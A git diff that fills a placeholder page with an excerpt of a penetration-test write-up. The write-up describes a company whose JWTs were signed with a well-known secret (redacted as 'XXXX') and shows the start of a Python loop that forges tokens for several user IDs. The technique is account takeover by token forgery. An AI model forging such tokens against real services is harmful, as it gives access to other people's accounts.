@@ -1,17 +1,66 @@
-# 🌐 
+# :globe_with_meridians: Unbelievable Security Hole: JWT Secret in a Series-B Funded Company
 
-> **Original Source:** [](https://infosecwriteups.com/unbelievable-security-hole-jwt-secret-in-a-series-b-funded-company-540434b54e59)
+> **Original Source:** [Unbelievable Security Hole: JWT Secret in a Series-B Funded Company](https://infosecwriteups.com/unbelievable-security-hole-jwt-secret-in-a-series-b-funded-company-540434b54e59)
 > **Platform:** infosecwriteups.com | **Category:** `WEB`
 
 ---
 
-## 🔗 Read Full Writeup
+# Unbelievable Security Hole: JWT Secret in a Series-B Funded Company
 
-This writeup is available on Medium. Click below to read the complete article with all details, code snippets, and screenshots.
 
-**[📖 Read Full Article on Medium](https://infosecwriteups.com/unbelievable-security-hole-jwt-secret-in-a-series-b-funded-company-540434b54e59)**
+It started as a routine penetration test. Little did I know I was about to uncover one of the most basic yet catastrophic security vulnerabilities imaginable in a company with 11.8 million users and $140 million in Series B funding.
+
+
+*image by easydmarc com*
+
+
+While testing their mobile API, Burp Suite flagged something that made me do a double-take:
+
+
+```
+Critical: JWT signed using well-known HMAC secret key. The key used was: XXXX
+```
+
+
+My first reaction was disbelief. Surely this had to be a false positive.
+
+## The Proof
+
+
+I decided to verify the finding. Using their own JWT structure:
+
+
+```
+{
+"iss": "redacted",
+"expwe": 90001760027408,
+"userId": 1813038, (*)
+"iyat": 1760027408,
+"sss": 17460027408
+}
+```
+
+
+With the secret “XXXX”, I generated a token and accessed their `/v1/auth/` endpoint. It worked. Then came the terrifying realization - I could access ANY user's account by simply changing the `userId` parameter.
+
+## The Escalation
+
+
+I wrote a simple Python script to demonstrate the impact:
+
+
+```
+import jwt
+import requests
+
+SECRET = "XXXX"
+
+for user_id in range(1, 11):
+token = jwt.encode(
+{"iss": "redacted", "expwe": 90001760027408…
+```
 
 ---
 
-*📖 Originally published on [Medium](https://infosecwriteups.com/unbelievable-security-hole-jwt-secret-in-a-series-b-funded-company-540434b54e59). All credit goes to the original author.*
-*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
+*Originally published on [Medium](https://infosecwriteups.com/unbelievable-security-hole-jwt-secret-in-a-series-b-funded-company-540434b54e59). All credit goes to the original author.*
+*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
